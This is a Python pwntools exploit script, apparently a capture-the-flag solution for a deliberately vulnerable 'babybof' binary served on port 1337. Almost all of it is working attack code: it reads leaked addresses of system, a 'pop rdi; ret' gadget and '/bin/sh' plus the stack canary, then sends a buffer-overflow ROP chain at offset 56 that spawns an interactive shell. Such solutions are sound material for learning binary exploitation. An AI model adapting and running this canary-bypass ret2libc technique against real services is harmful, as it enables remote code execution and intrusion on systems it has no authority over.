#!/usr/bin/env python3

from pwn import *

e = ELF("./vuln_patched_patched")

context.binary = e  # Set the target binary for pwntools
context.terminal = ["kitty", "-e"]  # Terminal to use for GDB debugging
HOST = "10.10.10.10"  # Remote host IP
PORT = 1337  # Remote port

gdb_script = """
b main  
b *0x4011ba
continue
"""

def conn():
    # Start local process with optional GDB or connect to remote
    if args.LOCAL:
        p = process([e.path])
        if args.GDB:
            gdb.attach(p, gdbscript=gdb_script)
    else:
        p = remote(HOST, PORT)
    return p

def main():
    p = conn()  # Establish connection to target

    # $pwn cyclic 200
    # $./vuln        
    # Welcome to babybof!
    # ....
    # enter your input (make sure your stack is aligned!): aaaabaaacaaada...
    # ....
    # canary: 0x616161706161616f
    # ....
    # $pwn unhex 616161706161616f
    # aaapaaao
    # $pwn cyclic -l aaap
    # 57
    offset = 56  # Offset to canary
    p.recvline()
    p.recvline()
    # Grab the leaked address
    system = int(p.recvline().split(b'system @ ')[1].strip(b'\n'), 16)
    popRDI = int(p.recvline().split(b'pop rdi; ret @ ')[1].strip(b'\n'), 16)
    ret = int(p.recvline().split(b'ret @ ')[1].strip(b'\n'), 16)
    binsh = int(p.recvline().split(b'"/bin/sh" @ ')[1].strip(b'\n'), 16)
    canary = int(p.recvline().split(b'canary: ')[1].strip(b'\n'), 16)
    info(f"system: {hex(system)}")
    info(f"popRDI: {hex(popRDI)}")
    info(f"ret: {hex(ret)}")
    info(f"/bin/sh: {hex(binsh)}")
    info(f"canary: {hex(canary)}")
    payload = flat({offset: [
          canary,
          0x00, # RBP
          ret,
          popRDI, binsh,
          system
        ]})
    p.sendline(payload)
    p.interactive()  # Hand over interaction to user for shell or output

if __name__ == "__main__":
    main()

